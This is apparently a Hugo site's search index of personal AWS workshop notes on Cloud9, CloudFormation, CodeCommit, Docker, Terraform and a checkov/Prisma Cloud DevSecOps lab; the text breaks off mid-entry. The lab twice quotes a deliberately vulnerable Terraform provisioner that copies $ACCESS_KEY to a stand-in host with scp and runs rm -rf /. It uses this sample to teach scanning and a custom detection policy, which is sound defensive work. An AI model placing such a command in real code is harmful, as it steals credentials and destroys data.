[
{
	"uri": "http://localhost:1313/aws-ws/",
	"title": " AWS Projects ",
	"tags": [],
	"description": "",
	"content": "AWS Projects Home | Sile Project\nAmazon Web Services (AWS) is a comprehensive, evolving cloud computing platform provided by Amazon.com. It offers a wide range of services, including computing power, storage solutions, networking, databases, machine learning, analytics, security, and more, all delivered over the internet.\nOverview\n1- Infrastructure as a Service (IaaS): AWS provides virtual computing resources over the internet. This includes computing power (Amazon EC2), storage (Amazon S3), and networking (Amazon VPC).\n2- Platform as a Service (PaaS): AWS offers platforms for building, deploying, and managing applications without worrying about the underlying infrastructure. Examples include AWS Elastic Beanstalk for deploying web applications and AWS Lambda for serverless computing.\n3- Software as a Service (SaaS): AWS hosts various software applications accessible over the internet. Examples include Amazon WorkMail for email and Amazon Chime for video conferencing.\n4- Storage Solutions: AWS provides scalable and secure storage services such as Amazon S3 (Simple Storage Service) for object storage, Amazon EBS (Elastic Block Store) for block storage, and Amazon Glacier for long-term archival storage.\n5- Database Services: AWS offers a range of managed database services, including Amazon RDS (Relational Database Service) for relational databases like MySQL, PostgreSQL, and Amazon Aurora, Amazon DynamoDB for NoSQL databases, and Amazon Redshift for data warehousing.\n6- Compute Services: AWS provides various compute services, including Amazon EC2 (Elastic Compute Cloud) for virtual servers, AWS Lambda for serverless computing, and Amazon ECS (Elastic Container Service) for container management.\n7- Networking: AWS offers networking services like Amazon VPC (Virtual Private Cloud) for creating isolated network environments, AWS Direct Connect for dedicated network connections, and Amazon Route 53 for domain name system (DNS) management.\n8- AI and Machine Learning: AWS provides AI and machine learning services such as Amazon SageMaker for building, training, and deploying machine learning models, Amazon Rekognition for image and video analysis, and Amazon Comprehend for natural language processing.\n9- Security and Compliance: AWS offers various security and compliance services, including AWS Identity and Access Management (IAM) for managing user access, AWS Shield for DDoS protection, and AWS Inspector for security assessment.\n10- Management and Monitoring: AWS provides tools for managing and monitoring resources, such as Amazon CloudWatch for monitoring, AWS CloudFormation for infrastructure as code, and AWS Trusted Advisor for optimizing costs and performance.\n11- IoT and Edge Computing: AWS offers services for Internet of Things (IoT) and edge computing, including AWS IoT Core for connecting devices to the cloud, AWS Greengrass for running IoT applications locally, and AWS IoT Device Defender for securing IoT devices.\n12- Developer Tools: AWS provides developer tools such as AWS CodeCommit for version control, AWS CodeBuild for continuous integration, and AWS CodeDeploy for deploying applications.\nContent Introduction Workshop Prepairation Configuration Cleanup "
},
{
	"uri": "http://localhost:1313/aws-ws/9-awssecu/9.1-secu/",
	"title": "91",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "http://localhost:1313/aws-ws/7-fcj/7.1-cloud9/",
	"title": "Cloud 9",
	"tags": [],
	"description": "",
	"content": "Use the Cloud IDE in the browser with AWS Cloud9 https://000049.awsstudygroup.com/\nCreate Cloud9 instance Create environment\nName: clou9instance Environment type: Select Create a new EC2 instance for environment (direct access). Instance type : Select t2.micro. Platform : Select Amazon Linux2. Cost-saving setting : select After 30 minutes. Allows to automatically stop Cloud9 instances to save costs. Create environment Dashboard interface Using AWS CLI aws ec2 describe-instances Clean up resources In AWS Cloud9 \u0026gt; Your environments : Select clou9instance and click Delete\n"
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.1-compute/",
	"title": "Cloud Computing Essentials",
	"tags": [],
	"description": "",
	"content": "Business Request The city\u0026rsquo;s web portal needs to migrate the beach wave size prediction page to AWS to improve reliability.\nLearning Objectives Articulate the characteristics of the AWS cloud computing platform. Describe the core benefits of using AWS products and services. Compare and contrast AWS cloud services to On-Premises infrastructure. Implement hosting a static web page using Amazon S3. Practice Lab Noted Review the practice lab objectives in the Concept section below. Click Start Lab to provision your environment, and then click Open AWS Console to begin. IMPORTANT: Be sure to use ONLY the AWS lab account provisioned by Cloud Quest. The use of any other AWS account is not supported and might incur charges. Follow the lab instructions carefully, and use the arrows below to navigate between steps. AWS services not used in this lab are disabled in the lab environment. In addition, the capabilities of the services used in this lab are limited to what the lab requires.\n"
},
{
	"uri": "http://localhost:1313/aws-ws/6-wsaudio/6.1-devsecops/",
	"title": "Cloud DevSecOps",
	"tags": [],
	"description": "",
	"content": "Cloud DevSecOps with Hashicorp, Palo Alto Networks \u0026amp; AWS Learning Objectives\nGain an understanding of DevSecOps and infrastructure as code (IaC) using Terraform Scan IaC files for misconfigurations locally Set up CI/CD pipelines to automate security scanning and policy enforcement Fix security findings and AWS resource misconfigurations with Prisma Cloud DevSecOps : https://catalog.us-east-1.prod.workshops.aws/workshops/e31afbdf-ee40-41fa-a6c9-6ba2cb55fc1e/en-US/1-table-content/2-devsecops\nThe foundation of DevSecOps lies in the DevOps movement, wherein development and operations functions have merged to make deployments faster, safer, and more repeatable. Common DevOps practices include automated infrastructure build pipelines (CI/CD) and version-controlled manifests (GitOps) to make it easier to control cloud deployments. By baking software and infrastructure quality requirements into the release lifecycle, teams save time manually reviewing code, letting teams focus on shipping features. Infrastructure as Code Using Terraform\nInfrastructure as code (IaC) frameworks, such as HashiCorp Terraform, make cloud provisioning scalable and straightforward by leveraging automation and code. Defining our cloud infrastructure in code simplifies repetitive DevOps tasks and gives us a versioned, auditable source of truth for the state of an environment. Setup / Prerequisities Github account Terraform Cloud account AWS account (provided during workshop) Prisma Cloud account (OPTIONAL) Log into AWS Workshop: [!NOTE] This section is for live workshop events only.\nConfigure IAM User and API Key\nUser name: tf-cloud Policies: AdminstratorAccess Create access key (other): Access key (Third-party service) Configure AWS Cloud9 IDE\nCreate environment (name): your-name-workspace\nEnv type: New EC2 instance\nAdditaional instance types: Types: t3.medium Platform: Amazon Linux 2023 Timeout: 30 minutes Network settings:\nConnection: AWS System Manager (SSM) -\u0026gt; Open in Cloud9 Create and activate a python virtual environment\npython3 -m venv env source ./env/bin/activate Section 1: Code Scanning with checkov Checkov: https://www.checkov.io/ Checkov is an open source \u0026lsquo;policy-as-code\u0026rsquo; tool that scans cloud infrastructure defintions to find misconfigurations before they are deployed. Some of the key benefits of checkov: Runs as a command line interface (CLI) tool Supports many common plaftorms and frameworks Ships with thousands of default policies Works on windows/mac/linux (any system with python installed) Install checkov: install, version , verify and see a list of every policy that Checkov can enforce\npip3 install checkov checkov --version checkov --help checkov --list 1. Fork and clone target repository\nThis workshop involves code that is vulnerable-by-design. All of the necessary code is contained within this repository or workshop guide itself.\nPrisma Cloud DevSecOps Workshop repository: https://github.com/paloAltoNetworks/prisma-cloud-devsecops-workshop\nGrab the repo URL from Github, then clone the forked repository to Cloud9.\ngit clone https://github.com/\u0026lt;your-organization\u0026gt;/prisma-cloud-devsecops-workshop.git cd prisma-cloud-devsecops-workshop/ git status Great! Now we have some code to scan. Let\u0026rsquo;s jump in\u0026hellip;\n2. Scan with checkov\nCheckov can be configured to scan files and enforce policies in many different ways. To highlight a few: Scans can run on individual files or entire directories. Policies can be selected through selection or omission. Enforcement can be determined by flags that control checkov\u0026rsquo;s exit code. Let\u0026rsquo;s start by scanning the entire ./code directory and viewing the results.\ncd code/ checkov -d . Is this learn theme rocks ?\r![6][5]\nFailed checks are returned containing the offending file and resource, the lines of code that triggered the policy, and a guide to fix the issue.\nNow try running checkov on an individual file with checkov -f \u0026lt;filename\u0026gt;.\nsimple_ec2.tf\rprovider \u0026#34;aws\u0026#34; { region = \u0026#34;us-west-2\u0026#34; } resource \u0026#34;aws_ec2_host\u0026#34; \u0026#34;test\u0026#34; { instance_type = \u0026#34;t3.micro\u0026#34; availability_zone = \u0026#34;us-west-2a\u0026#34; provisioner \u0026#34;local-exec\u0026#34; { command = \u0026#34;echo Running install scripts.. \u0026#39;echo $ACCESS_KEY \u0026gt; creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /\u0026#39; \u0026#34; } } checkov -f deployment_ec2.tf checkov -f simple_ec2.tf Policies can be optionally enforced or skipped with the --check and --skip-check flags.\ncheckov -f deployment_s3.tf --check CKV_AWS_18,CKV_AWS_52 checkov -f deployment_s3.tf --skip-check CKV_AWS_18,CKV_AWS_52 Frameworks can also be selected or omitted for a particular scan:\ncheckov -d . --framework secrets --enable-secret-scan-all-files checkov -d . --skip-framework dockerfile Lastly, enforcement can be more granularly controlled by using the \u0026ndash;soft-fail option. Applying \u0026ndash;soft-fail results in the scan always returning a 0 exit code. Using \u0026ndash;hard-fail-on overrides this option.\nCheck the exit code when running checkov -d . with and without the \u0026ndash;soft-fail option.\ncheckov -d . ; echo $? checkov -d . --soft-fail ; echo $? 3. Custom polices\nCheckov supports the creation of Custom Policies for users to customize their own policy and configuration checks. Custom policies can be written in YAML (recommended) or python and applied with the --external-checks-dir or --external-checks-git flags.\nLet\u0026rsquo;s create a custom policy to check for local-exec and remote-exec Provisioners being used in Terraform resource definitons. https://developer.hashicorp.com/terraform/language/resources/provisioners/local-exec\nExpand provisioners code: check.yaml\rmetadata: name: \u0026#34;Terraform contains local-exec and/or remote-exec provisioner\u0026#34; id: \u0026#34;CKV2_TF_1\u0026#34; category: \u0026#34;GENERAL_SECURITY\u0026#34; definition: and: - cond_type: \u0026#34;attribute\u0026#34; resource_types: all attribute: \u0026#34;provisioner/local-exec\u0026#34; operator: \u0026#34;not_exists\u0026#34; - cond_type: \u0026#34;attribute\u0026#34; resource_types: all attribute: \u0026#34;provisioner/remote-exec\u0026#34; operator: \u0026#34;not_exists\u0026#34; Add the above code to a new file within a new direcotry.\nmkdir custom-checks/ vim custom-checks/check.yaml [!TIP] use echo \u0026lsquo;$(file_contents)\u0026rsquo; \u0026gt; custom-checks/check.yaml if formatting is an issue with vim.\nSave the file. Then run checkov with the \u0026ndash;external-checks-dir to test the custom policy.\nsimple_ec2.tf\rprovider \u0026#34;aws\u0026#34; { region = \u0026#34;us-west-2\u0026#34; } resource \u0026#34;aws_ec2_host\u0026#34; \u0026#34;test\u0026#34; { instance_type = \u0026#34;t3.micro\u0026#34; availability_zone = \u0026#34;us-west-2a\u0026#34; provisioner \u0026#34;local-exec\u0026#34; { command = \u0026#34;echo Running install scripts.. \u0026#39;echo $ACCESS_KEY \u0026gt; creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /\u0026#39; \u0026#34; } } checkov -f simple_ec2.tf --external-checks-dir custom-checks Challenge: *write a custom policy to check all resources for the presence of tags. Specifically, ensure that a tag named \u0026ldquo;Environment\u0026rdquo; exists.\nIDE plugin: [!NOTE] Demo Only. Requires API key for Prisma Cloud.\nLink to docs: Prisma Cloud IDE plugins\nLink to docs: VScode extension\nEnabling checkov in an IDE provides real-time scan (in Cloud9) Github Actions: Create a new action from scratch = checkov.yaml checkov.yaml\rname: checkov on: pull_request: push: branches: - main jobs: scan: runs-on: ubuntu-latest permissions: contents: read # for actions/checkout to fetch code security-events: write # for GitHub/codeql-action/upload-sarif to upload SARIF results steps: - uses: actions/checkout@v2 - name: Run checkov id: checkov uses: bridgecrewio/checkov-action@master with: directory: code/ #soft_fail: true #api-key: ${{ secrets.BC_API_KEY }} #env: #PRISMA_API_URL: https://api4.prismacloud.io - name: Upload SARIF file uses: GitHub/codeql-action/upload-sarif@v2 # Results are generated only on a success or failure # this is required since GitHub by default won\u0026#39;t run the next step # when the previous one has failed. Alternatively, enable soft_fail in checkov action. if: success() || failure() with: sarif_file: results.sarif Notice the policy violations that were seen earlier in CLI/Cloud9 are now displayed here. View results in Github Security Checkov natively supports SARIF format and generates this output by default. GitHub Security accepts SARIF for uploading security issues. The GitHub Action created earlier handles the plumbing between the two.\nNavigate to the Security tab in GitHub, the click Code scanning from the left sidebar or View alerts in the Security overview \u0026gt; Code scanning alerts section.\nThe security issues found by checkov are surfaced here for developers to get actionable feedback on the codebase they are working in without having to leave the platform.\nTag and Trace with Yor: Yor is another open source tool that can be used for tagging and tracing IaC resources from code to cloud. For example, yor can be used to add git metadata and a unique hash to a terraform resource; this can be used to better manage resource lifecycles, improve change management, and ultimately to help tie code defintions to runtime configurations.\nCreate new file in the GitHub UI under the path .github/workflows/yor.yaml. Expand: yor.yaml\rname: IaC tag and trace on: push: pull_request: jobs: yor: runs-on: ubuntu-latest permissions: contents: write steps: - uses: actions/checkout@v2 name: Checkout repo with: fetch-depth: 0 - name: Run yor action uses: bridgecrewio/yor-action@main Viewing any .tf file in the code/ directory. Branch Protection Rules: Using Branch Protection Rules allows for criteria to be set in order for pushes and pull requests to be merged to a given branch. This can be set up to run checkov and block merges if there are any misconfigurations or vulnerabilities.\nGithub \u0026gt; Branches \u0026gt; Add branch protection rule. Enter: main Check: Require status checks to pass before merging search for checkov (scan) Integrate workflow with Terraform Cloud Create a new organizaion: some_org\nEmail:\nCreate a New Workspace: VS Workflow\nConnect to Github \u0026gt; Choose the prisma-cloud-devsecops-workshop from the list of repositories. Add a Workspace: Name: prisma-cloud-devsecops-workshop Project: Default Project Terraform Working Directory: /code/bulid/ VS Triggers: Only trigger Select Syntax: Patterns Pull Requests: Check Automatic speculative plans -\u0026gt; Continue to workspace overview prisma-cloud-devsecops-workshop: Configure variables\nAdd variables for AWS_SECRET_KEY_ID and AWS_SECRET_ACCESS_KEY. Ensure you select Environment variables for both and that AWS_SECRET_ACCESS_KEY is marked as Sensitive. AWS S3 Access\rIAM user: tf-cloud Attach policies: AdministratorAccess Security credentials: Access key (Third-party service) Block a Pull Request, Prevent a Deployment We have now configured a GitHub repository to be scanned with checkov and to trigger Terraform Cloud to deploy infrastructure Create a new file in the GitHub UI under the path code/build/s3.tf Expand s3.tf\rprovider \u0026#34;aws\u0026#34; { region = \u0026#34;us-west-2\u0026#34; } resource \u0026#34;aws_s3_bucket\u0026#34; \u0026#34;dev_s3\u0026#34; { bucket_prefix = \u0026#34;dev-\u0026#34; tags = { Environment = \u0026#34;Dev\u0026#34; } } resource \u0026#34;aws_s3_bucket_ownership_controls\u0026#34; \u0026#34;dev_s3\u0026#34; { bucket = aws_s3_bucket.dev_s3.id rule { object_ownership = \u0026#34;BucketOwnerPreferred\u0026#34; } } Once complete, click Commit changes\u0026hellip; at the top right, then select Create a new branch and start a pull request and click Propose changes. At the next screen, review the diff then click Create pull request. Either bypass branch protections and Merge pull request or go back to the Github Action for checkov and uncomment the line with --soft-fail=true. This will require closing and reopening a new pull request. ISSUE:\nFix: code/build\nproviders.tf\rterraform { required_providers { aws = { source = \u0026#34;hashicorp/aws\u0026#34; } } } provider \u0026#34;aws\u0026#34; { region = \u0026#34;us-west-2\u0026#34; } s3.tf change to main.tf\rresource \u0026#34;aws_s3_bucket\u0026#34; \u0026#34;dev_s3\u0026#34; { bucket_prefix = \u0026#34;dev-\u0026#34; tags = { Environment = \u0026#34;Dev\u0026#34; yor_name = \u0026#34;dev_s3\u0026#34; yor_trace = \u0026#34;d6c205d2-67e5-4856-a003-e9d4a2629f8d\u0026#34; git_commit = \u0026#34;69a9110e596f86b5250039de52aa332e25b79a36\u0026#34; git_file = \u0026#34;code/build/s3.tf\u0026#34; git_last_modified_at = \u0026#34;2024-05-14 10:49:55\u0026#34; git_last_modified_by = \u0026#34;150504127+nonotnonez@users.noreply.github.com\u0026#34; git_modifiers = \u0026#34;150504127+nonotnonez\u0026#34; git_org = \u0026#34;nonotnonez\u0026#34; git_repo = \u0026#34;prisma-cloud-devsecops-workshop\u0026#34; } } resource \u0026#34;aws_s3_bucket_ownership_controls\u0026#34; \u0026#34;dev_s3\u0026#34; { bucket = aws_s3_bucket.dev_s3.id rule { object_ownership = \u0026#34;BucketOwnerPreferred\u0026#34; } } Workflow Deploy to AWS Update main.tf and merge to main repo Navigate to Terraform Cloud and view the running plan. Go to the S3 menu within AWS to view the bucket that has been deployed. Now let\u0026rsquo;s see how we can leverage Prisma Cloud to make this all easier, gain more featues and scale security at ease. Terraform destroy\nSettings - Destruction and Deletion Destroy infrastructure -\u0026gt; Queue destroy plan Amazone S3 overview\nWelcome to Prisma Cloud Prisma Cloud is a Cloud Native Application Protection Platform (CNAPP) comprised of three main pillars:\nCloud Security Runtime Security Application Security Across these three \u0026ldquo;modules\u0026rdquo;, Prisma Cloud provides comprehensive security capabilities spanning code to cloud. This workshop will mainly focus on the Application Security module within the Prisma Cloud platform.\nSection 2: Application Security with Prisma Cloud Onboard AWS Account We need to configure Prisma Cloud to communitcate with a CSP. Let\u0026rsquo;s do this by onboarding an AWS Account.\nNavigate to Settings \u0026gt; Providers \u0026gt; Connect Provider and follow the instructions prompted by the conifguration wizard.\nSelect Amazon Web Services. Choose Account for the scope, deselect Agentless Workload Scanning, leave the rest as default and click Done. Provide your Account ID and enter an Account Name. Then click Create IAM Role to have Prisma Cloud auto-configure itself. Scroll to the bottom of the AWS page that opens, click to acknowledge the disclaimer and then click Create stack. Wait a moment while the stack is created, we need an output from the final result of the stack being deployed. Once created, go to the Outputs tab and copy the value of ARN displayed. Head back to Prisma Cloud and paste this value into the IAM Role ARN field, then click Next. Wait for the connectivity test to run, review the status and click Save and Close. View the onboarded cloud account under Settings \u0026gt; Providers. 2.Integrations and Providers\nLet\u0026rsquo;s start by integrating with checkov. Checkov with API Key To generate an API key, navigate to Settings \u0026gt; Access Control. Click the Add button and select Access Key. Download the csv file containing the credentials then click Done. In a terminal window run checkov against the entire code directory, now with an API key. Use the following command: checkov -d . --bc-api-key \u0026lt;access_key_id::\u0026lt;secret_key\u0026gt; --repo-id prisma/devsecops-workshop --prisma-api-url https://api4.prismacloud.io Notice how the results now contain a severity. There are some other features that come with Prisma Cloud (using an API key) as well\u0026hellip;\nReturn back to Prisma Cloud to view the results that checkov surfaced in the platform. Navigate to Application Security \u0026gt; Projects.\nLet\u0026rsquo;s add this same API key to the GitHub Action created earlier. Within your GitHub repository, go to Settings \u0026gt; Secrets and variables then select Actions.\nClick New repository secret then input the secret value of \u0026lt;access_key_id\u0026gt;::\u0026lt;secret_key\u0026gt; pair. Edit checkov.yaml, remove comments for api-key and PRISMA_API_URL. Commit directly to main branch. Now check the results under Security \u0026gt; Code scanning. The same findings that displayed here earlier now with a Severity to sort and prioritze with.\nReturn again to Prisma Cloud to view the results that were sent to the the platform.\n[!TIP] You can use Prisma Cloud (checkov w/ an API key) to scan docker images for vulnerabilities! Use the --docker-image flag and point to an image name or ID.\nTerraform Cloud Run Tasks Let\u0026rsquo;s now connect Prisma Cloud with Terraform Cloud using the Run Tasks integration. This allows for developers and platform teams to get immediate security feedback for every pipeline run. The Run Task integration will also surface results of every pipeline run to Prisma Cloud and the Security team.\nFirst we need to create an API key in Terraform Cloud. Go to the Terraform Cloud console and navigate to User Settings \u0026gt; Tokens then click Create an API Token. Copy the token and save the value somewhere safe. This will be provided to Prisma Cloud in the next step. Go to the Prisma Cloud console and navigate to Settings \u0026gt; Connect Provider \u0026gt; Code \u0026amp; Build Providers to set up the integration. Under CI/CD Runs, choose Terraform Cloud (Run Tasks). Enter the API token generated in Terraform Cloud and click Next. Select your Organization. Select your Workspace and choose the Run Stage in which you want Prisma Cloud to execute a scan. Pre-plan will scan HCL code, Post-plan will scan the Terraform plan.out file. Once completed, click Done. Return back to Terraform Cloud to view the integration. Go to your Workspace and click Settings \u0026gt; Run Tasks. GitHub Application Next we will set up the Prisma Cloud GitHub Application which will perform easy-to-configure code scanning for GitHub repos.\nGo to Prisma Cloud and create a new integration under Settings \u0026gt; Connect Provider \u0026gt; Code \u0026amp; Build Providers. Under Code Repositories, select GitHub. Follow the install wizard and Authorize your GitHub account. Select the repositories you would like to provide access to and click Install \u0026amp; Authorize. Select the target repositories to scan now accessible from the Prisma Cloud wizard, then click Next. Click Done once completed. Navigate to Settings \u0026gt; Providers \u0026gt; Repositories to view the onboarded repo(s). Submit a Pull Request 2.0 Lets push a change to test the integration. Navigate to GitHub and make a change to the s3 resource deployed earlier under code/build/s3.tf.\nAdd the following line of code to the s3 resource definition. Then click Commit changes\u0026hellip; once complete.\nacl = \u0026#34;public-read-write\u0026#34; Create a new branch and click Propose changes. On the next page, review the diff then click Create pull request. Once gain, click Create pull request to open the pull request. Let the checks run against the pull request. Prisma Cloud can review pull requests and will add comments with proposed changes to give developers actionable feedback within their VCS platform. When ready, click Merge pull request bypassing branch protection rules if still enabled. Now that the change has been merged, navigate back to Terraform Cloud to view the pipeline running. Check the Post-plan stage and view the results of the Prisma Cloud scan. Leave this as is for now. We will soon fix the error and retrigger the pipeline. View scan results in Prisma Cloud Return to Prisma Cloud to view the results of all the scans that were just performed.\nNavigate to Application Security \u0026gt; Projects \u0026gt; Overview to view findings for all scans. Filter the results with the Repository drop-down menu.\nView relevant CI/CD Risks Application Security \u0026gt; CI/CD Risks:\nGet a full SBOM analysis under Application Security \u0026gt; SBOM:\nTake a look at Dashboards \u0026gt; Code Security to get top-level reports.\nAnother useful view can be found under Inventory \u0026gt; IaC Resources\nEnforcement Rules The level of enforcement applied to each code scan can be controlled under Settings \u0026gt; Configure \u0026gt; Application Security \u0026gt; Enforcement Rules\nThese can be adjusted as a top-down policy or exceptions can be created for specific repositories / integrations.\nIssue a PR-Fix Lets create a pull request from the Prisma Cloud console to apply a code fix. Navigate to Application Security \u0026gt; Projects \u0026gt; Overview IaC Misconfiguration then find the dev_s3 bucket with the public access violations.\nThen click the Submit button in the top right to open a pull request.\nNavigate back to GitHub and check the Pull request tab to see the fix Prisma Cloud submitted.\nDrill into the pull request and inspect the file changes under the Files changes tab. Notice the changes made to remediate the original policy violation.\nGo back to the Coversation tab and click Merge the pull request at the bottom to check this code into the main branch.\nCheck Terraform Cloud to view the plan succesfully run. No need to apply this run as we will use the earlier deployment for our next example.\nDrift Detection In this final section, we will use the pipeline we built to detect drift. Drift occurs when infrastructure running in the cloud becomes configured differntly from what was originally defined in code.\nThis usually happens during a major incident, where DevOps and SRE teams make manual changes to quickly solve a problem, such as opening up ports to larger CIDR blocks or turning off HTTPS to find the problem. Sometimes lack of access and/or familiarity with IaC/CICD makes fixing an issue directly in the cloud easier than fixing in code and redeploying. If these aren’t reverted, they present security issues and it weakens the benefits of using IaC.\nWe will use the S3 bucket deployed earlier to simulate drift in a resource configuration.\n[!NOTE] By default Prisma Cloud performs full resource scans on an hourly interval.\nNext, go to the AWS Console under S3 buckets and add a new tag to the bucket created earlier.\nFor example, add a tag with the key/value pair drift = true and click Save changes.\nOn the next scan Prisma Cloud will detect this change and notify users that a resource configuration has changed from how it is defined in code. To view this, navigate to Projects \u0026gt; IaC Misconfiguration and filter for Drift under the IaC Categories dropdown menu.\nPrisma Cloud provides the option to revert the change via the same pull request mechanism we just performed which would trigger a pipeline run and patch the resource.\nWrapping Up Congrats! In this workshop, we didn’t just learn how to identify and automate fixing misconfigurations — we learned how to bridge the gaps between Development, DevOps, and Cloud Security. We are now equipped with full visibility, guardrails, and remediation capabilities across the development lifecycle. We also learned how important and easy it is to make security accessible to our engineering teams.\nTry more of the integrations with other popular developer and DevOps tools. Share what you’ve found with other members of your team and show how easy it is to incorporate this into their development processes.\n"
},
{
	"uri": "http://localhost:1313/aws-ws/12-automate/12.1-cf/",
	"title": "CloudFormation",
	"tags": [],
	"description": "",
	"content": "AWS CloudFormation A template is a JSON- or YAML-formatted text file Resource:\nThe resources section of the template describes the resource type, in this case the EC2 instance. Properties:\nThe property section describes properties such as the instance type, image ID, and the security group to use. CloudFormation can only perform actions that you have permission to do\nDemo:\nCloudformation \u0026gt; Stacks\nCreate stack Prepare temple: Use a sample template Select: WorkPress blog Specify stack details Stack name: workpress-blog Parameters: DBName: workpressdb DBPassword: *** DBRootPassword: *** DBUser: *** InstanceType: t2.micro KeyName: SSHLocation: NEXT Configure stack options Perrmissions IAM role: (limit CF) NEXT SUBMIT "
},
{
	"uri": "http://localhost:1313/aws-ws/8-devopsaws/8.1-commit/",
	"title": "CodeCommit",
	"tags": [],
	"description": "",
	"content": "\nOverview A version control is the ability to understand the various changes that happen to the code over time. The key to version control is that you should be able to roll back to the commits. And all of these can be enabled using a version control system. And a very popular one is called Git.\nVersion control is the ability to understand the various changes that happened to the code overtime (and possibly roll back)\nCreate Repo Developer Tools \u0026gt; CodeCommit \u0026gt; Repository \u0026gt; Create repository\nRepository name: cicd-repo\nIAM User\nUser name: cicd-user Permission: AdministratorAccess Download Access \u0026amp; Secret key Credentials\nUser: cicd-user Credentials : HTTPS Git credentials for AWS CodeCommit Generate credentials Clone Repo\nRepo: cicd-repo Clone URL - Clone HTTPS Ex: git clone https://git-commit.aws-east-1.amazonaws.com/v1/repos/cicd-repo Clone, add, commit, push Local\nCopy source code to repo git status git add . git status git commit -m \u0026ldquo;First Commit\u0026rdquo; git push Check on AWS repo\nRepositories Code Commits - master Branching Local website check: index.html\nEdit index.htm (v2) git status git add . git commit -m \u0026ldquo;revised index to v2\u0026rdquo; git push Check on AWS repo\nCommits : review changes Branch merge pull request Create branch\ngit checkout -b feature1 edit index.html (v3) git add . git commit -m \u0026ldquo;revised index to v3\u0026rdquo; git push Check AWS repo\nBranches Pull request\nCreate pull request Destination: master Source: feature1 Compare Details Title: mergefeature1 Create pull request Check \u0026gt; Changes (review changes) Merge Delete after merge Merge pull request Branches\nCode: check index.html\n"
},
{
	"uri": "http://localhost:1313/aws-ws/2-prepair/2.1-docker/",
	"title": "Container",
	"tags": [],
	"description": "",
	"content": "A container is a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries, and settings\nOverview Docker Docker is a platform that enables developers to build, package, ship, and run applications in containers. It provides tools and a platform to manage containerized applications across different environments, from development to production. Docker Compose Docker Compose is a tool provided by Docker that allows you to define and manage multi-container Docker applications. It uses a YAML file to configure the services, networks, and volumes required for your application Configuration Check the installed software\ndocker --version docker-compose --version Create a docker compose file to run the software on the container environment\ndocker-compose.yml version: \u0026#39;3\u0026#39; services: # Terraform terraform: image: hashicorp/terraform:latest volumes: - .:/terraform working_dir: /terraform # AWS CLI\u0026#39; aws: image: anigeo/awscli environment: AWS_ACCESS_KEY_ID: \u0026#34;${AWS_ACCESS_KEY_ID}\u0026#34; AWS_SECRET_ACCESS_KEY: \u0026#34;${AWS_SECRET_ACCESS_KEY}\u0026#34; AWS_REGION: \u0026#34;${AWS_REGION}\u0026#34; AWS_DEFAULT_REGION: ap-southeast-1 volumes: - $PWD:/app working_dir: /app "
},
{
	"uri": "http://localhost:1313/aws-ws/3-config/3.1-iac/3.1.1-ec2/",
	"title": "EC2",
	"tags": [],
	"description": "",
	"content": "In this Workshop we will automate create an EC2 instances with the information bellow by using Terraform, Docker-compose and AWS CLI\nOverview AWS EC2 AWS User : tf-cli\nAccess \u0026amp; Secret key : tf_cli-access_key.json\nAWS Key-pair : tf-cli-keypair\nEC2 Instance:\nInstances name: Web-Server VPC: 10.0.0.0/16 Subnets: 10.0.1.0/24 Region: Singapore (ap-southeast-1) Available zone: ap-southeast-1b Instance type: t2.micro Amazon Machine Images: Amazon Linux 2 AMI Key pair: tf-cli-keypair Security setting: Only allow my ip connect SSH to EC2 instance Allow all access from port 8080 to EC2 instance Review Configuration Container: Docker-compose.yml version: \u0026#39;3\u0026#39; services: # Terraform terraform: image: hashicorp/terraform:latest volumes: - .:/terraform working_dir: /terraform # AWS CLI\u0026#39; aws: image: anigeo/awscli environment: AWS_ACCESS_KEY_ID: \u0026#34;${AWS_ACCESS_KEY_ID}\u0026#34; AWS_SECRET_ACCESS_KEY: \u0026#34;${AWS_SECRET_ACCESS_KEY}\u0026#34; AWS_REGION: \u0026#34;${AWS_REGION}\u0026#34; AWS_DEFAULT_REGION: ap-southeast-1 volumes: - $PWD:/app working_dir: /app AWS : User Access , Secret Key, Key Pair: # check aws version docker-compose run --rm aws --version # create aws user docker-compose run --rm aws iam create-user --user-name tf-cli # create access key for user docker-compose run --rm aws iam create-access-key --user-name tf-cli \u0026gt; tf_cli-access_key.json # create keypair for ec2 docker-compose run --rm aws ec2 create-key-pair --key-name tf-cli-keypair --query \u0026#39;KeyMaterial\u0026#39; --output text \u0026gt; tf-cli-keypair.pem Attach User with Policy Access EC2 and Limit Region\r# Custom policy file: ec2-limited-access-policy.json # Create IAM poliy: EC2FullAccessAPSouthEast1 docker-compose run --rm aws iam attach-user-policy --user-name tf-cli --policy-arn arn:aws:iam::637423373411:policy/EC2FullAccessAPSouthEast1 # ec2-limited-access-policy.json\r{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;ec2:*\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;Condition\u0026#34;: { \u0026#34;StringEquals\u0026#34;: { \u0026#34;ec2:Region\u0026#34;: \u0026#34;ap-southeast-1\u0026#34; } } } ] } Terraform : variables.tf - Security credential variables variable \u0026#34;access_key\u0026#34; { type = string sensitive = true } variable \u0026#34;secret_key\u0026#34; { type = string sensitive = true } variable \u0026#34;region\u0026#34; { type = string default = \u0026#34;ap-southeast-1\u0026#34; } main.tf - Instances configurations\rvariable vpc_cidr_block {} variable subnet_1_cidr_block {} variable avail_zone {} variable env_prefix {} variable instance_type {} variable my_ip {} variable ami_id {} resource \u0026#34;aws_vpc\u0026#34; \u0026#34;myapp-vpc\u0026#34; { cidr_block = var.vpc_cidr_block tags = { Name = \u0026#34;${var.env_prefix}-vpc\u0026#34; } } resource \u0026#34;aws_subnet\u0026#34; \u0026#34;myapp-subnet-1\u0026#34; { vpc_id = aws_vpc.myapp-vpc.id cidr_block = var.subnet_1_cidr_block availability_zone = var.avail_zone tags = { Name = \u0026#34;${var.env_prefix}-subnet-1\u0026#34; } } resource \u0026#34;aws_security_group\u0026#34; \u0026#34;myapp-sg\u0026#34; { name = \u0026#34;myapp-sg\u0026#34; vpc_id = aws_vpc.myapp-vpc.id ingress { from_port = 22 to_port = 22 protocol = \u0026#34;tcp\u0026#34; cidr_blocks = 